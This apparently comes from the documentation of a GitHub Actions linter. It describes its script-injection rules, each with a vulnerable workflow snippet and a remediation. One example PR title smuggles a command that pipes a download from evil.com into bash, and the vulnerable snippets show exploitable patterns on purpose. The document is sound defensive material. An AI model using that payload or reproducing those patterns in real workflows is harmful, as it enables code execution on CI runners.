# Injection Rules (100s)

Script injection occurs when untrusted data from `github.event` or other external sources is interpolated directly into `run:` steps, environment variables, or action inputs. An attacker who controls the injected value can execute arbitrary shell commands in the runner.

---

## WRD-101: Expression Injection

**Severity:** Critical

**What it detects:** Direct interpolation of attacker-controlled `github.event.*` and `github.head_ref` expressions inside `run:` blocks using `${{ ... }}` syntax. Covers a broad set of tainted sources including issue titles, PR bodies, comment bodies, commit messages, discussion content, and head ref.

**Vulnerable:**

```yaml
- name: Print PR title
  run: echo "Title: ${{ github.event.pull_request.title }}"
```

An attacker opens a PR titled `"; curl https://evil.com/exfil | bash; echo "` to execute arbitrary commands.

**Remediation:** Assign the value to an environment variable and reference it in the shell. The runner sanitizes values passed through `env:`.

```yaml
- name: Print PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $PR_TITLE"
```

---

## WRD-110: Composite Action Input Injection

**Severity:** High

**What it detects:** `${{ inputs.* }}` expressions interpolated in `run:` blocks of composite actions (`action.yml` / `action.yaml`). When the action is consumed with attacker-controlled values, this enables command injection.

**Vulnerable:**

```yaml
# action.yml
name: My Action
runs:
  using: composite
  steps:
    - run: echo "Processing ${{ inputs.user_name }}"
      shell: bash
```

**Remediation:** Use an environment variable instead of direct interpolation.

```yaml
- env:
    USER_NAME: ${{ inputs.user_name }}
  run: echo "Processing $USER_NAME"
  shell: bash
```

---

## WRD-111: Dispatch Input Injection

**Severity:** High

**What it detects:** `workflow_dispatch` or `repository_dispatch` inputs interpolated directly in `run:` blocks. Dispatch inputs can be controlled by any user with push access.

**Vulnerable:**

```yaml
on:
  workflow_dispatch:
    inputs:
      deploy_target:
        type: string
jobs:
  deploy:
    steps:
      - run: ./deploy.sh ${{ inputs.deploy_target }}
```

**Remediation:** Pass dispatch inputs through environment variables.

```yaml
- env:
    TARGET: ${{ inputs.deploy_target }}
  run: ./deploy.sh "$TARGET"
```

---

## WRD-112: GITHUB_ENV/PATH Injection

**Severity:** High

**What it detects:** Writes to `$GITHUB_ENV` or `$GITHUB_PATH` in `run:` blocks. If the written value originates from attacker-controlled input, subsequent steps can be hijacked via environment variable or PATH manipulation.

**Vulnerable:**

```yaml
- run: echo "TARGET=${{ github.event.inputs.target }}" >> $GITHUB_ENV
```

An attacker can inject newlines to set arbitrary environment variables including `PATH` or `LD_PRELOAD`.

**Remediation:** Validate and sanitize before writing to `GITHUB_ENV`. Prefer step outputs with explicit typing.

```yaml
- env:
    INPUT_TARGET: ${{ github.event.inputs.target }}
  run: |
    if [[ "$INPUT_TARGET" =~ ^[a-zA-Z0-9_-]+$ ]]; then
      echo "TARGET=$INPUT_TARGET" >> $GITHUB_ENV
    fi
```

---

## WRD-113: Tainted Reusable Workflow Inputs

**Severity:** High

**What it detects:** Attacker-controlled values (`github.head_ref`, `github.event.pull_request.title`, issue/comment bodies, etc.) passed as inputs to reusable workflows. If the called workflow interpolates them unsafely in a `run:` block, command injection is possible.

**Vulnerable:**

```yaml
jobs:
  lint:
    uses: my-org/shared/.github/workflows/lint.yml@main
    with:
      branch: ${{ github.head_ref }}
```

**Remediation:** Sanitize or validate the value before passing it. Ensure the called workflow uses environment variables instead of direct interpolation.

---

## WRD-120: Step Output Injection

**Severity:** Medium

**What it detects:** `steps.*.outputs.*` expressions interpolated in `run:` blocks. Step outputs may carry attacker-controlled data if a prior step set the output from tainted input.

**Vulnerable:**

```yaml
- id: get-input
  run: echo "value=${{ github.event.pull_request.title }}" >> $GITHUB_OUTPUT
- run: do-something ${{ steps.get-input.outputs.value }}
```

**Remediation:** Pass step outputs through environment variables. Validate or sanitize outputs before use.

```yaml
- env:
    INPUT_VAL: ${{ steps.get-input.outputs.value }}
  run: do-something "$INPUT_VAL"
```
